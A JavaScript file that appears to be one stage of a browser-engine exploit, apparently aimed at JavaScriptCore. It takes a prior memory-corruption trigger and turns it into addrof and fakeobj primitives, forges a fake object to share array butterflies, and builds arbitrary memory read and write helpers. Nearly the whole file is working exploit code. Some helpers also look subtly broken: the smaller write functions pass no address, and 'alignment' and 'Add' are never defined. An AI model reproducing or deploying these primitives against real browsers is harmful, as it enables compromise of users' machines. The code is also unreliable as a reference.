let doubleArrayCellHeader = new Int64(0x0108230700000000);
const kBoxedDoubleOffset = new Int64(0x0002000000000000);
const leak = 0x1a;

function createJSObjectmirror(target, _internal_prims) {
  let _internal = {
    jsCellHeader: doubleArrayCellHeader.sub(kBoxedDoubleOffset).asDouble(),
    butterfly: target,
  };

  let _internal_address = _internal_prims.addrof(_internal);
  let _internal_object = _internal_prims.fakeobj(_internal_address.add(0x10));

  let _internal_target = {
    get jsCellHeader() {
      return Int64.fromDouble(_internal_object[0]);
    },
    set jsCellHeader(newHeader) {
      _internal_object[0] = newHeader.asDouble();
    },

    get butterfly() {
      return Int64.fromDouble(_internal_object[1]);
    },

    set butterfly(newButterfly) {
      _internal_object[1] = newButterfly.asDouble();
    },
  };

  return {
    get jsCellHeader() {
      return Int64.fromDouble(_internal.jsCellHeader);
    },
    set jsCellHeader(newHeader) {
      _internal.jsCellHeader = newHeader.asDouble();
    },

    get target() {
      return _internal_target;
    },
    set target(newButterfly) {
      _internal.butterfly = newButterfly;
    }
  };
}

stages.push(() => {
  if (boxedDoubles.length != leak)
    throw new Error(`Trigger failed (0x${boxedDoubles.length.toString(16)})`);

  primitives = new (class {
    constructor() {

      this.readWriteDoubles = boxedDoubles;
      this.readWriteContiguous = contiguous;

      this.mirror = createJSObjectmirror(initialDoubles, {
        addrof: (value) => {
          this.readWriteContiguous[0] = value;
          return Int64.fromDouble(this.readWriteDoubles[leak]);
        },
        fakeobj: (address) => {
          this.readWriteDoubles[0x1a] = address.asDouble(); // Have trust ;)
          return this.readWriteContiguous[0];
        },
      });
    
      doubleArrayCellHeader = this.mirror.target.jsCellHeader
        .sub(0x1)
        .add(0x1000000000);
    
      this.mirror.target.jsCellHeader = doubleArrayCellHeader;
    
      this.originalButterfly = this.mirror.target.butterfly;
    
      this.mirror.target = initialContiguous;
      this.mirror.target.jsCellHeader = doubleArrayCellHeader;
    
      this.mirror.jsCellHeader =
        doubleArrayCellHeader.sub(kBoxedDoubleOffset);

      this.mirror = this.mirror;
      this.originalButterfly = this.originalButterfly;
      this.setSharedButterfly(this.originalButterfly);
    }

    setSharedButterfly(newButterfly) {
      for (let i = 0; i < 2; i++) {
        // TODO: Why twice
        this.mirror.target = this.readWriteContiguous;
        this.mirror.target.butterfly = newButterfly;
        this.mirror.target = this.readWriteDoubles;
        this.mirror.target.butterfly = newButterfly;
      }
    }

    resetButterfly() {
      this.setSharedButterfly(this.originalButterfly);
    }

    addrof(object) {
      this.readWriteContiguous[0] = object;
      return Int64.fromDouble(this.readWriteDoubles[0]);
    }

    fakeobj(address) {
      this.readWriteContiguous[0] = address.asDouble();
      return this.readWriteContiguous[0];
    }

    read8(where, offset = 0) {
      let val = this.read64(where, offset);
      return new Int64(val.asInt8());
    }

    write8(where, what, offset = 0) {
      let val = this.read64(where, offset);
      val.xor(val.asInt8());
      val.add(what.asInt8());
      this.write64(val);
    }

    read16(where, offset = 0) {
      let val = this.read64(where, offset);
      return new Int64(val.asInt16());
    }

    write16(where, what, offset = 0) {
      let val = this.read64(where, offset);
      val.xor(val.asInt16());
      val.add(what.asInt16());
      this.write64(val);
    }

    read32(where, offset = 0) {
      let val = this.read64(where, offset);
      return new Int64(val.asInt32());
    }

    write32(where, what, offset = 0) {
      let val = this.read64(where, offset);
      val.xor(val.asInt32());
      val.add(what.asInt32());
      this.write64(val);
    }

    read64(where, offset = 0) {
      where = Add(where, this.alignment * offset);
      this.setSharedButterfly(where);
      const val = Int64.fromDouble(this.readWriteDoubles[0]);
      this.resetButterfly();
      return val;
    }

    write64(where, what, offset = 0) {
      where = Add(where, this.alignment * offset);
      this.setSharedButterfly(where);
      this.readWriteContiguous[0] = what;
      this.resetButterfly();
    }
  })();

  gc();

  printf(`Starting with primitives: ${primitives.addrof(primitives)}\n\n`, 2);
});